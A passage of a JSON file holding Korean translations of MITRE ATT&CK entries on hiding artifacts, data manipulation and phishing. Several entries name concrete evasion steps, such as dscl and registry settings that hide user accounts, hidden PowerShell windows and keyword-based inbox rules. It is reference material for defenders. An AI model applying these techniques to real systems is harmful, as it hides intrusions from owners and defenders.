      "description": "대적자는 탐지를 피하기 위해 자신의 행동과 관련된 아티팩트를 숨기려 할 수 있습니다. 운영 체제는 사용자 작업 환경을 방해하거나 사용자가 시스템의 파일이나 기능을 변경하지 못하도록 하기 위해 중요한 시스템 파일 및 관리 작업 실행과 같은 다양한 아티팩트를 숨기는 기능을 제공할 수 있습니다. 대적자는 이러한 기능을 악용하여 파일, 디렉터리, 사용자 계정 또는 기타 시스템 활동과 같은 아티팩트를 숨겨 탐지를 피할 수 있습니다. (인용: Sofacy Komplex Trojan)(인용: Cybereason OSX Pirrit)(인용: MalwareBytes ADS 2015년 7월)\n\n대적자는 또한 가상화 기술을 사용하여 공통 보안 장비로부터 격리된 컴퓨팅 영역을 생성함으로써 악의적인 행동과 관련된 아티팩트를 숨기려 할 수 있습니다. (인용: Sophos Ragnar 2020년 5월)",
      "external_id": "T1564",
      "modified": "2024-10-15T15:58:49.815Z",
      "title": "Hide Artifacts",
      "translated": true
    },
    {
      "description": "적대자는 탐지 메커니즘을 피하기 위해 파일 및 디렉토리를 숨길 수 있습니다. 대부분의 운영 체제는 시스템의 특별한 파일이 우연히 변경되는 것을 방지하기 위해 '숨김' 파일 개념을 가지고 있습니다. 이러한 파일은 사용자가 GUI를 통해 파일 시스템을 탐색할 때나 명령 줄에서 일반 명령을 사용할 때 표시되지 않습니다. 사용자는 GUI 프롬프트 시리즈를 통해 또는 명령 줄 스위치(<code>dir /a</code>는 Windows, <code>ls –a</code>는 Linux 및 macOS용)로 숨김 파일을 표시하도록 명시적으로 요청해야 합니다.\n\nLinux 및 Mac에서는 사용자가 파일이나 폴더 이름의 첫 번째 문자로 “.”을 넣기만 하면 특정 파일을 숨김으로 표시할 수 있습니다 (인용: Sofacy Komplex Trojan) (인용: 구식 Mac 맬웨어). 점(' . ')으로 시작하는 파일 및 폴더는 기본적으로 Finder 응용 프로그램과 “ls”와 같은 표준 명령줄 유틸리티에서 보이지 않도록 숨겨집니다. 사용자는 이러한 파일을 볼 수 있도록 설정을 명시적으로 변경해야 합니다.\n\nmacOS에서는 UF_HIDDEN 플래그로 파일을 표시할 수도 있으며, 이 플래그는 Finder.app에서 해당 파일이 보이지 않도록 하지만 여전히 Terminal.app에서는 볼 수 있도록 허용합니다 (인용: WireLurker). Windows에서는 사용자가 attrib.exe 바이너리를 사용하여 특정 파일을 숨김으로 표시할 수 있습니다. 많은 애플리케이션이 이러한 숨김 파일 및 폴더를 생성하여 정보를 저장하고 사용자의 작업 공간을 어지럽히지 않도록 합니다. 예를 들어, SSH 유틸리티는 사용자의 알려진 호스트 및 키를 포함하는 숨김 .ssh 폴더를 생성합니다.\n\n적대자는 이를 이용하여 시스템 어디에서나 파일 및 폴더를 숨기고, 숨김 파일 조사를 포함하지 않는 일반 사용자 또는 시스템 분석을 회피할 수 있습니다.",
      "external_id": "T1564.001",
      "modified": "2020-03-29T22:32:25.985Z",
      "title": "Hidden Files and Directories",
      "translated": true
    },
    {
      "description": "적대 세력은 사용자 계정을 생성하거나 수정한 존재를 숨기기 위해 숨겨진 사용자 기능을 사용할 수 있습니다. 관리자는 특정 시스템에 많은 사용자 계정이 있을 때 또는 다른 사용자로부터 관리자 계정이나 기타 관리 계정을 숨기고 싶을 때 사용자를 숨기고자 할 수 있습니다.\n\nmacOS에서 적대 세력은 plist 파일, 폴더 속성 및 사용자 속성을 조작하여 사용자를 숨기거나 수정할 수 있습니다. 로그인 화면과 시스템 환경설정에서 사용자가 표시되지 않도록 하기 위해, 적대 세력은 사용자 ID를 500 미만으로 설정하고 <code>/Library/Preferences/com.apple.loginwindow</code> plist 파일에서 <code>Hide500Users</code> 키 값을 <code>TRUE</code>로 설정합니다. (출처: Cybereason OSX Pirrit) 각 사용자에게는 관련된 사용자 ID가 있습니다. <code>Hide500Users</code> 키 값이 <code>TRUE</code>로 설정되면, 사용자 ID가 500 미만인 사용자는 로그인 화면과 시스템 환경설정에서 나타나지 않습니다. 명령줄을 사용하여, 적대 세력은 <code>dscl</code> 유틸리티를 사용하여 <code>IsHidden</code> 속성을 <code>1</code>로 설정함으로써 숨겨진 사용자 계정을 생성할 수 있습니다. 적대 세력은 또한 <code>chflags</code>를 변경하여 사용자의 홈 폴더를 숨길 수 있습니다. (출처: Apple Support Hide a User Account)\n\n적대 세력은 비슷하게 Windows에서 사용자 계정을 숨길 수 있습니다. 적대 세력은 특정 사용자가 로그인 화면에 나열되지 않도록 하기 위해 <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> 레지스트리 키 값을 <code>0</code>으로 설정할 수 있습니다. (출처: FireEye SMOKEDHAM June 2021) (출처: US-CERT TA18-074A)\n\nLinux 시스템에서도 적대 세력은 로그인 화면에서 사용자 계정을 숨길 수 있습니다. 적대 세력이 사용하는 방법은 배포판에서 현재 사용 중인 디스플레이 관리자에 따라 달라집니다. 예를 들어, GNOME 디스플레이 관리자를 사용하는 Ubuntu 시스템에서는 <code>gsettings</code> 명령을 사용하여 로그인 화면에서 계정을 숨길 수 있습니다 (예: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). (출처: Hide GDM User Accounts) 디스플레이 관리자는 특정 배포판에 고정되어 있지 않으며, 사용자 또는 적대 세력에 의해 변경될 수 있습니다.",
      "external_id": "T1564.002",
      "modified": "2022-04-19T02:31:01.315Z",
      "title": "Hidden Users",
      "translated": true
    },
    {
      "description": "공격자는 숨겨진 창을 사용하여 사용자에게 악성 활동을 감추는 방법을 사용할 수 있습니다. 특정 작업을 실행할 때 애플리케이션이 일반적으로 표시하는 창을 숨길 수 있는 경우도 있습니다. 이러한 기능은 시스템 관리자가 관리 작업을 수행할 때 사용자 작업 환경을 방해하지 않기 위해 활용할 수 있습니다.\n\n공격자는 이러한 기능을 악용하여 사용자가 볼 수 있는 다른 창을 숨겨 사용자에게 시스템에서의 공격자 활동을 알리지 않도록 할 수 있습니다.(출처: 고대 맥 악성코드)\n\nmacOS에서는 애플리케이션이 어떻게 실행되는지에 대한 설정이 프로퍼티 리스트(plist) 파일에 나열되어 있습니다. 이 파일의 태그 중 하나는 <code>apple.awt.UIElement</code>로, Java 애플리케이션이 Dock에 애플리케이션 아이콘이 나타나는 것을 방지할 수 있게 해줍니다. 이는 애플리케이션이 시스템 트레이에서 실행되지만 Dock에는 나타나지 않기를 원할 때 일반적으로 사용됩니다.\n\n유사하게, Windows에서는 [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript 및 [Visual Basic](https://attack.mitre.org/techniques/T1059/005)과 같은 스크립팅 언어에서 창을 숨기는 다양한 기능이 지원됩니다. 그 예로는 <code>powershell.exe -WindowStyle Hidden</code>이 있습니다.(출처: PowerShell About 2019)\n\n또한, Windows는 고유의 <code>explorer.exe</code> 프로세스와 함께 숨겨진 데스크톱 창을 생성할 수 있는 `CreateDesktop()` API를 지원합니다.(출처: Hidden VNC)(출처: Anatomy of an hVNC Attack) 숨겨진 데스크톱 창에서 실행되는 모든 애플리케이션, 예를 들어 숨겨진 VNC (hVNC) 세션,(출처: Hidden VNC)은 다른 데스크톱 창에는 보이지 않게 됩니다.",
      "external_id": "T1564.003",
      "modified": "2024-04-13T14:28:20.651Z",
      "title": "Hidden Window",
      "translated": true
    },
    {
      "description": "공격자는 NTFS 파일 속성을 사용하여 탐지를 회피하기 위해 악성 데이터를 숨길 수 있습니다. 모든 새로운 기술 파일 시스템(NTFS)으로 포맷된 파티션은 파티션의 모든 파일/디렉터리에 대한 기록을 유지하는 마스터 파일 테이블(MFT)을 포함하고 있습니다. MFT 항목 내에는 확장 속성(EA) 및 데이터(여러 데이터 속성이 존재할 때 대체 데이터 스트림(ADS)으로 알려짐)와 같은 파일 속성이 포함되어 있으며, 이는 임의의 데이터(심지어 전체 파일) 저장에 사용될 수 있습니다. \n\n공격자는 파일 속성 메타데이터에 악성 데이터나 이진 파일을 저장하여 파일 내에 직접 저장하는 대신에 이를 수행할 수 있습니다. 이는 정적 지표 스캐닝 도구 및 안티바이러스와 같은 일부 방어를 회피하기 위해 사용할 수 있습니다.",
      "external_id": "T1564.004",
      "modified": "2024-09-12T15:27:29.615Z",
      "title": "NTFS File Attributes",
      "translated": true
    },
    {
      "description": "공격자는 사용자 및 보안 도구로부터 악성 활동을 숨기기 위해 숨겨진 파일 시스템을 사용할 수 있습니다. 파일 시스템은 물리적 저장소에서 데이터를 저장하고 접근하는 구조를 제공합니다. 일반적으로 사용자는 파일과 디렉토리에 접근할 수 있는 응용 프로그램을 통해 파일 시스템과 상호작용하는데, 이는 물리적 위치(예: 디스크 섹터)의 추상화입니다. 표준 파일 시스템에는 FAT, NTFS, ext4 및 APFS가 포함됩니다. 파일 시스템은 또한 NTFS의 볼륨 부트 레코드(VBR) 및 마스터 파일 테이블(MFT)과 같은 다른 구조를 포함할 수 있습니다.(인용: MalwareTech VFS Nov 2014)\n\n공격자는 감염된 시스템에 존재하는 표준 파일 시스템과는 별도로, 자신만의 추상화된 파일 시스템을 사용할 수 있습니다. 이를 통해 공격자는 악성 구성 요소 및 파일 입출력의 존재를 보안 도구에서 숨길 수 있습니다. 숨겨진 파일 시스템은 때때로 가상 파일 시스템이라고도 하며, 여러 가지 방법으로 구현될 수 있습니다. 한 가지 구현 방법은 디스크 구조나 표준 파일 시스템 파티션에서 사용하지 않는 예약된 디스크 공간에 파일 시스템을 저장하는 것입니다.(인용: MalwareTech VFS Nov 2014)(인용: FireEye Bootkits) 또 다른 구현은 공격자가 표준 파일 시스템 위에 자신의 휴대용 파티션 이미지를 파일로 떨어뜨리는 것입니다.(인용: ESET ComRAT May 2020) 공격자는 또한 기존 파일 시스템 구조를 비표준 방식으로 조각화할 수 있습니다.(인용: Kaspersky Equation QA)",
      "external_id": "T1564.005",
      "modified": "2020-06-29T15:12:11.024Z",
      "title": "Hidden File System",
      "translated": true
    },
    {
      "description": "공격자들은 탐지를 피하기 위해 가상 인스턴스를 사용하여 악의적인 작업을 수행할 수 있습니다. 컴퓨터 또는 컴퓨팅 환경을 에뮬레이션할 수 있는 다양한 가상화 기술이 존재합니다. 악성 코드를 가상 인스턴스 내에서 실행함으로써 공격자들은 보안 도구가 가상 인스턴스 내의 활동을 모니터링할 수 없기 때문에 자신의 행동과 관련된 흔적을 숨길 수 있습니다. 또한, 가상 네트워킹 구현에 따라(예: 브릿지 어댑터) 가상 인스턴스가 생성하는 네트워크 트래픽은 침해된 호스트로 다시 추적하기 어려울 수 있으며, 이 경우 IP 주소 및 호스트 이름이 알려진 값과 일치하지 않을 수 있습니다. (출처: SingHealth 유출 2019년 1월)\n\n공격자들은 네이티브 가상화 지원(예: Hyper-V)을 활용하거나 가상 인스턴스를 실행하는 데 필요한 파일(예: VirtualBox 바이너리)을 설치할 수 있습니다. 가상 인스턴스를 실행한 후, 공격자들은 게스트와 호스트 간에 공유 폴더를 생성하여 가상 인스턴스가 호스트 파일 시스템과 상호작용할 수 있는 권한을 부여할 수 있습니다. (출처: Sophos Ragnar 2020년 5월)",
      "external_id": "T1564.006",
      "modified": "2021-10-14T22:21:59.708Z",
      "title": "Run Virtual Instance",
      "translated": true
    },
    {
      "description": "상대방은 MS Office 문서에 임베디드된 악성 Visual Basic for Applications (VBA) 페이로드를 숨기기 위해 VBA 소스 코드를 무해한 데이터로 교체할 수 있습니다. (인용: FireEye VBA stomp 2020년 2월)\n\nMS Office 문서에 임베디드된 VBA 콘텐츠는 모듈 스트림 내에 소스 코드를 저장합니다. 각 모듈 스트림은 별도의 컴파일된 VBA 소스 코드 버전인 p-code를 저장하는 <code>PerformanceCache</code>를 가지고 있습니다. p-code는 <code>_VBA_PROJECT</code> 스트림(여기에는 VBA 프로젝트에 대한 버전 종속 설명이 포함됨)에서 지정된 MS Office 버전이 호스트 MS Office 응용 프로그램의 버전과 일치할 때 실행됩니다. (인용: Evil Clippy 2019년 5월)(인용: Microsoft _VBA_PROJECT Stream)\n\n상대방은 VBA 소스 코드 위치를 0으로 덮어쓰거나, 무해한 코드 또는 무작위 바이트로 교체하여 악성 VBA 코드를 숨길 수 있으며, 이전에 컴파일된 악성 p-code는 그대로 남겨둡니다. 악성 VBA 소스 코드를 스캔하는 도구는 원하지 않는 코드가 컴파일된 p-code에 숨겨져 있기 때문에 우회될 수 있습니다. VBA 소스 코드가 제거되면 일부 도구는 매크로가 존재하지 않는다고 판단할 수도 있습니다. <code>_VBA_PROJECT</code> 스트림과 호스트 MS Office 응용 프로그램 간에 버전이 일치하면 p-code가 실행되며, 그렇지 않을 경우 무해한 VBA 소스 코드는 압축 해제되고 p-code로 다시 컴파일되어 악성 p-code를 제거하고 동적 분석을 우회할 수 있습니다. (인용: Walmart Roberts 2018년 10월)(인용: FireEye VBA stomp 2020년 2월)(인용: pcodedmp Bontchev)",
      "external_id": "T1564.007",
      "modified": "2021-10-15T14:02:07.944Z",
      "title": "VBA Stomping",
      "translated": true
    },
    {
      "description": "공격자는 침해된 사용자의 메일박스에서 수신 이메일을 숨기기 위해 이메일 규칙을 사용할 수 있습니다. 많은 이메일 클라이언트는 사용자가 이메일을 다른 폴더로 이동하거나, 읽음으로 표시하거나, 삭제하는 등 다양한 이메일 기능을 위해 받은편지함 규칙을 생성할 수 있도록 허용합니다. 이러한 규칙은 이메일 클라이언트 내에서 또는 Windows 시스템의 <code>New-InboxRule</code> 또는 <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet을 통해 생성되거나 수정될 수 있습니다. (출처: Microsoft Inbox Rules)(출처: MacOS Email Rules)(출처: Microsoft New-InboxRule)(출처: Microsoft Set-InboxRule)\n\n공격자는 침해된 사용자의 메일박스 내에서 이메일 규칙을 활용하여 이메일을 삭제하거나 덜 눈에 띄는 폴더로 이동시킬 수 있습니다. 공격자는 이를 통해 보안 경고, C2 통신, 또는 침해된 계정에서 발송된 [내부 피싱](https://attack.mitre.org/techniques/T1534) 이메일에 대한 응답을 숨기려 할 수 있습니다.\n\n조직 내의 모든 사용자나 관리자(또는 유효한 자격 증명을 가진 공격자)는 이메일을 자동으로 이동하거나 삭제하는 규칙을 생성할 수 있습니다. 이러한 규칙은 사용자 또는 방어자가 이메일 내용을 즉시 확인했을 경우 탐지를 방해하거나 지연시키기 위해 악용될 수 있습니다. 악의적인 규칙은 일반적으로 메시지 본문 및 제목에 있는 키워드(예: <code>malware</code>, <code>suspicious</code>, <code>phish</code>, <code>hack</code>)를 기반으로 이메일을 필터링합니다. (출처: Microsoft Cloud App Security)\n\n일부 환경에서는 관리자가 개별 받은편지함이 아닌 조직 전체에서 작동하는 이메일 규칙을 활성화할 수 있습니다. 예를 들어, Microsoft Exchange는 조직이 수신하는 모든 메일을 사용자가 지정한 조건에 대해 평가하고, 해당 조건에 부합하는 메일에 대해 사용자가 지정한 작업을 수행하는 전송 규칙을 지원합니다. (출처: Microsoft Mail Flow Rules 2023) 이러한 기능을 악용하는 공격자는 특정 주제(예: 내부 보안 사건 통지)와 관련된 모든 이메일을 자동으로 수정하거나 삭제할 수 있습니다.",
      "external_id": "T1564.008",
      "modified": "2024-10-15T15:56:27.592Z",
      "title": "Email Hiding Rules",
      "translated": true
    },
    {
      "description": "위협 행위자는 자원 포크를 악용하여 탐지를 회피하고 보안 애플리케이션을 우회하기 위해 악성 코드나 실행 파일을 숨길 수 있습니다. 자원 포크는 애플리케이션이 썸네일 이미지, 메뉴 정의, 아이콘, 대화 상자 및 코드를 저장하는 구조화된 방법을 제공합니다. (출처: macOS 계층적 파일 시스템 개요) 자원 포크의 사용은 파일의 확장 속성을 표시할 때 확인할 수 있으며, <code>ls -l@</code> 또는 <code>xattr -l</code> 명령어를 사용할 수 있습니다. 자원 포크는 더 이상 사용되지 않으며 애플리케이션 번들 구조로 대체되었습니다. 비지역화 자원은 애플리케이션 번들의 최상위 디렉토리에 위치하며, 지역화 자원은 <code>/Resources</code> 폴더에 배치됩니다. (출처: 자원 및 데이터 포크) (출처: ELC 확장 속성)\n\n위협 행위자는 자원 포크를 사용하여 악성 데이터를 숨길 수 있으며, 이러한 데이터는 파일에 직접 저장될 수 있습니다. 위협 행위자는 지정된 오프셋에서 실행 가능한 위치로 이동한 후 호출되는 자원 포크가 첨부된 콘텐츠를 실행할 수 있습니다. 자원 포크의 콘텐츠는 실행될 때까지 난독화되거나 암호화될 수도 있습니다. (출처: sentinellabs resource named fork 2020) (출처: tau bundlore erika noerenberg 2020)",
      "external_id": "T1564.009",
      "modified": "2022-05-05T05:10:23.890Z",
      "title": "Resource Forking",
      "translated": true
    },
    {
      "description": "대적자는 프로세스 메모리를 덮어써서 프로세스 명령줄 인수를 숨기려고 시도할 수 있습니다. 프로세스 명령줄 인수는 Windows가 프로세스에 대한 다양한 정보를 저장하는 데 사용하는 데이터 구조인 프로세스 환경 블록(PEB)에 저장됩니다. PEB에는 프로세스를 실행할 때 참조되는 프로세스 명령줄 인수가 포함되어 있습니다. 프로세스가 생성될 때, 프로세스 생성 모니터링 도구/센서는 PEB에서 프로세스 인수를 검색할 수 있습니다.(출처: Microsoft PEB 2021)(출처: Xpn Argue Like Cobalt 2019)\n\n대적자는 방어를 회피하기 위해 프로세스 PEB를 조작할 수 있습니다. 예를 들어, [프로세스 할로윙](https://attack.mitre.org/techniques/T1055/012)은 유해하지 않은 인수로 프로세스를 정지된 상태에서 생성하기 위해 악용될 수 있습니다. 프로세스가 생성되고 PEB가 초기화되면(이때 프로세스 정보가 도구/센서에 의해 기록될 수 있음), 대적자는 PEB를 덮어써서 명령줄 인수를 수정할 수 있습니다(예: [네이티브 API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> 함수를 사용) 그런 다음 유해한 인수와 함께 프로세스 실행을 재개할 수 있습니다.(출처: Cobalt Strike Arguments 2019)(출처: Xpn Argue Like Cobalt 2019)(출처: Nviso Spoof Command Line 2020)\n\n대적자는 또한 유해한 명령줄 인수로 프로세스를 실행한 다음, 후속 프로세스 메모리 분석을 우회할 수 있는 유해하지 않은 인수로 메모리를 패치할 수 있습니다.(출처: FireEye FiveHands April 2021)\n\n이 행동은 [부모 PID 스푸핑](https://attack.mitre.org/techniques/T1134/004)과 같은 다른 트릭과 결합되어 프로세스 기반 탐지를 조작하거나 더 회피할 수 있습니다.",
      "external_id": "T1564.010",
      "modified": "2021-11-29T15:56:50.370Z",
      "title": "Process Argument Spoofing",
      "translated": true
    },
    {
      "description": "적대자는 프로세스 인터럽트 신호에서 숨기는 명령을 실행하여 방어 메커니즘을 회피할 수 있습니다. 많은 운영 체제는 프로세스 동작을 제어하기 위해 메시지를 전달하는 신호를 사용합니다. 명령 해석기는 사용자가 활성 세션에서 로그오프할 때와 같이 오류 및 기타 중단을 무시하는 특정 명령/플래그를 포함하는 경우가 많습니다.(출처: Linux Signal Man) 이러한 인터럽트 신호는 방어 도구 및/또는 분석가가 특정 실행 중인 프로세스를 일시 중지하거나 종료하는 데 사용할 수 있습니다.\n\n적대자는 `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue` 또는 중단에 저항할 수 있는 유사한 명령을 통해 프로세스를 호출할 수 있습니다.(출처: nohup Linux Man)(출처: Microsoft PowerShell SilentlyContinue) 이는 악의적인 명령과 악성 코드가 사용자가 로그오프하거나 C2 네트워크 연결이 종료되는 등의 시스템 이벤트를 통해 실행이 종료되는 것을 방지하고 계속해서 실행될 수 있도록 할 수 있습니다.\n\n프로세스 인터럽트 신호에서 숨는 것은 악성 코드가 계속 실행될 수 있게 하지만, [Trap](https://attack.mitre.org/techniques/T1546/005)과는 달리, 이는 [Persistence](https://attack.mitre.org/tactics/TA0003)를 확립하지 않습니다. 왜냐하면 실제로 종료된 후에는 프로세스가 다시 호출되지 않기 때문입니다.",
      "external_id": "T1564.011",
      "modified": "2023-11-06T20:14:51.609Z",
      "title": "Ignore Process Interrupts",
      "translated": true
    },
    {
      "description": "공격자들은 파일 기반의 유물(artifacts)을 숨기기 위해 안티바이러스(AV) 스캔 및 기타 방어 기능에서 제외된 특정 폴더나 파일 이름에 작성할 수 있습니다. AV 및 기타 파일 기반 스캐너는 성능 최적화와 애플리케이션의 설치 및 합법적인 사용을 용이하게 하기 위해 종종 예외를 포함합니다. 이러한 예외는 상황에 따라 다를 수 있으며(예: 특정 트리거 이벤트/알림에 응답하여 스캔이 시작됨), 특정 폴더 및/또는 신뢰할 수 있고 합법적인 것으로 간주되는 파일을 참조하는 하드코딩된 문자열일 수도 있습니다. (인용: Microsoft 파일 폴더 제외)\n\n공격자들은 이러한 예외를 악용하여 파일 기반의 유물을 숨길 수 있습니다. 예를 들어, 도구 설정을 수정하여 새로운 예외를 추가하기보다는(즉, [도구 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/001)), 공격자들은 기본값 또는 잘 알려진 예외에 파일 기반 페이로드를 배치할 수 있습니다. 공격자들은 또한 [보안 소프트웨어 탐지](https://attack.mitre.org/techniques/T1518/001) 및 기타 [탐색](https://attack.mitre.org/tactics/TA0007)/[정찰](https://attack.mitre.org/tactics/TA0043) 활동을 통해 희생자 환경에서 기존 예외를 발견하고 확인할 수 있습니다.",
      "external_id": "T1564.012",
      "modified": "2024-04-15T23:42:39.831Z",
      "title": "File/Path Exclusions",
      "translated": true
    },
    {
      "description": "적대자는 외부 결과에 영향을 미치거나 활동을 숨기기 위해 데이터를 삽입, 삭제 또는 조작할 수 있으며, 이로 인해 데이터의 무결성이 위협받을 수 있습니다. (출처: Sygnia Elephant Beetle 2022년 1월) 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 또는 의사결정에 영향을 미치려고 시도할 수 있습니다.\n\n수정의 유형과 그로 인한 영향은 대상 애플리케이션 및 프로세스, 그리고 적대자의 목표와 목적에 따라 다릅니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 특별한 전문 지식과 보통은 장기적인 정보 수집 캠페인을 통해 획득할 수 있는 시스템 관련 전문 소프트웨어에 대한 접근이 필요할 가능성이 높습니다.",
      "external_id": "T1565",
      "modified": "2024-02-02T17:18:39.004Z",
      "title": "Data Manipulation",
      "translated": true
    },
    {
      "description": "적대자는 외부 결과에 영향을 미치거나 활동을 숨기기 위해 저장된 데이터를 삽입, 삭제 또는 조작할 수 있으며, 이로 인해 데이터의 무결성이 위협받게 됩니다. (출처: FireEye APT38 2018년 10월) (출처: DOJ Lazarus Sony 2018) 저장된 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려고 할 수 있습니다.\n\n저장된 데이터에는 Office 파일, 데이터베이스, 저장된 이메일 및 사용자 정의 파일 형식과 같은 다양한 파일 형식이 포함될 수 있습니다. 수정의 유형과 그로 인한 영향은 데이터의 유형 및 적대자의 목표와 목적에 따라 달라집니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 일반적으로 장기적인 정보 수집 캠페인을 통해 얻어질 수 있는 시스템과 관련된 특수 소프트웨어에 대한 특별한 전문 지식 및 접근이 필요할 가능성이 높습니다.",
      "external_id": "T1565.001",
      "modified": "2024-08-26T16:33:33.982Z",
      "title": "Stored Data Manipulation",
      "translated": true
    },
    {
      "description": "적대자는 데이터가 저장소나 다른 시스템으로 전송되는 과정에서 데이터를 변경하여 외부 결과를 조작하거나 활동을 숨길 수 있습니다. 이로 인해 데이터의 무결성이 위협받을 수 있습니다. (출처: FireEye APT38 2018년 10월) (출처: DOJ 라자루스 소니 2018년) 전송된 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n조작은 네트워크 연결을 통해 또는 시스템 프로세스 간에 정보가 가로채지고 변경될 기회가 있을 때 가능합니다. 수정의 유형과 그로 인한 영향은 대상 전송 메커니즘과 적대자의 목표 및 목적에 따라 달라집니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 특별한 전문 지식과 해당 시스템과 관련된 특수 소프트웨어에 대한 접근이 필요할 가능성이 높으며, 이는 일반적으로 장기간의 정보 수집 캠페인을 통해 얻어집니다.",
      "external_id": "T1565.002",
      "modified": "2024-08-26T16:33:33.983Z",
      "title": "Transmitted Data Manipulation",
      "translated": true
    },
    {
      "description": "적대 세력은 사용자가 데이터에 접근하고 이를 표시할 때 데이터를 조작하기 위해 시스템을 수정할 수 있으며, 이로 인해 데이터 무결성이 위협받을 수 있습니다. (인용: FireEye APT38 2018년 10월)(인용: DOJ Lazarus Sony 2018년) 런타임 데이터를 조작함으로써 적대 세력은 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n적대 세력은 런타임 조작을 일으키기 위해 데이터를 표시하는 데 사용되는 애플리케이션 이진 파일을 변경할 수 있습니다. 또한 적대 세력은 [기본 파일 연결 변경](https://attack.mitre.org/techniques/T1546/001) 및 [가면 쓰기](https://attack.mitre.org/techniques/T1036)와 같은 기법을 수행하여 유사한 효과를 유도할 수 있습니다. 수정의 종류와 그로 인해 발생할 영향은 목표 애플리케이션 및 프로세스뿐만 아니라 적대 세력의 목표와 의도에 따라 달라집니다. 복잡한 시스템의 경우, 적대 세력은 원하는 영향을 미치기 위해 일반적으로 장기간의 정보 수집 캠페인을 통해 얻어진 전문 소프트웨어에 대한 액세스 및 특정 전문 지식이 필요할 수 있습니다.",
      "external_id": "T1565.003",
      "modified": "2024-10-15T18:21:43.760Z",
      "title": "Runtime Data Manipulation",
      "translated": true
    },
    {
      "description": "공격자는 피해 시스템에 접근하기 위해 피싱 메시지를 보낼 수 있습니다. 모든 형태의 피싱은 전자적으로 전달되는 사회 공학입니다. 피싱은 특정 대상에 초점을 맞춘 경우를 ‘스피어 피싱’이라고 하며, 이 경우 공격자는 특정 개인, 회사 또는 산업을 목표로 삼습니다. 일반적으로 공격자는 대량 맬웨어 스팸 캠페인과 같은 비타겟팅 피싱을 수행할 수 있습니다.\n\n공격자는 피해자에게 악성 첨부파일이나 링크가 포함된 이메일을 보내 주로 피해 시스템에서 악성 코드를 실행하도록 할 수 있습니다. 피싱은 소셜 미디어 플랫폼과 같은 제3자 서비스를 통해서도 수행될 수 있습니다. 피싱은 신뢰할 수 있는 출처인 것처럼 가장하는 등의 사회 공학 기술뿐만 아니라, 메시지를 보내기 위해 악용되는 손상된 계정에서 이메일이나 메타데이터/헤더를 제거하거나 조작하는 회피 기술을 포함할 수도 있습니다 (예: [이메일 숨기기 규칙](https://attack.mitre.org/techniques/T1564/008)). (출처: Microsoft OAuth Spam 2022)(출처: Palo Alto Unit 42 VBA Infostealer 2014). 다른 방법으로는 발신자의 신원을 위조하거나 스푸핑하는 방식이 있습니다 (출처: Proofpoint-spoof), 이를 통해 인간 수신자와 자동화된 보안 도구 모두를 속일 수 있습니다 (출처: cyberproof-double-bounce), 또는 악성 파일이나 링크가 포함된 기존 이메일 스레드에 의도된 대상을 포함시켜 \"스레드 하이재킹\"을 수행할 수 있습니다 (출처: phishing-krebs).\n\n피해자는 또한 전화를 걸도록 지시하는 피싱 메시지를 받을 수 있으며, 이러한 메시지에서는 악성 URL을 방문하거나 맬웨어를 다운로드하라는 안내를 받을 수 있습니다 (출처: sygnia Luna Month)(출처: CISA 원격 모니터링 및 관리 소프트웨어), 또는 공격자가 접근할 수 있는 원격 관리 도구를 컴퓨터에 설치하도록 요청받을 수 있습니다 (즉, [사용자 실행](https://attack.mitre.org/techniques/T1204)). (출처: Unit42 Luna Moth)",
      "external_id": "T1566",
      "modified": "2024-10-07T15:00:19.668Z",
      "title": "Phishing",
      "translated": true
    },
    {
      "description": "위협 행위자는 피해 시스템에 접근하기 위해 악성 첨부파일이 포함된 스피어 피싱 이메일을 보낼 수 있습니다. 스피어 피싱 첨부파일은 스피어 피싱의 특정 변형이며, 이메일에 첨부된 악성 소프트웨어를 사용한다는 점에서 다른 형태의 스피어 피싱과 다릅니다. 모든 형태의 스피어 피싱은 특정 개인, 회사 또는 산업을 목표로 하는 전자적으로 전달되는 사회 공학입니다. 이 시나리오에서는 위협 행위자가 스피어 피싱 이메일에 파일을 첨부하고 일반적으로 [사용자 실행](https://attack.mitre.org/techniques/T1204)을 통해 실행을 유도합니다. (인용: Unit 42 DarkHydrus, 2018년 7월) 스피어 피싱은 또한 신뢰할 수 있는 출처로 가장하는 등의 사회 공학 기술을 포함할 수 있습니다.\n\n첨부파일에는 Microsoft Office 문서, 실행 파일, PDF 또는 압축 파일 등 다양한 유형이 있을 수 있습니다. 첨부파일을 열고 (잠재적으로 보호 장치를 우회하여) 클릭할 경우, 위협 행위자의 페이로드는 취약점을 악용하거나 사용자 시스템에서 직접 실행됩니다. 스피어 피싱 이메일의 텍스트는 일반적으로 파일을 열어야 하는 그럴듯한 이유를 제시하려 하며, 파일을 여는 방법에 대한 시스템 보호 장치 우회 방법을 설명할 수 있습니다. 이메일에는 첨부파일을 암호 해독하는 방법에 대한 지침, 예를 들어 zip 파일의 비밀번호가 포함되어 있을 수 있으며, 이는 이메일 경계 방어를 회피하기 위한 것입니다. 위협 행위자는 종종 파일 확장자와 아이콘을 조작하여 첨부된 실행 파일이 문서 파일인 것처럼 보이게 하거나, 하나의 응용 프로그램을 악용하는 파일이 다른 응용 프로그램의 파일인 것처럼 보이게 만듭니다.",
      "external_id": "T1566.001",
      "modified": "2024-10-15T16:42:01.552Z",
      "title": "Spearphishing Attachment",
      "translated": true
    },
    {
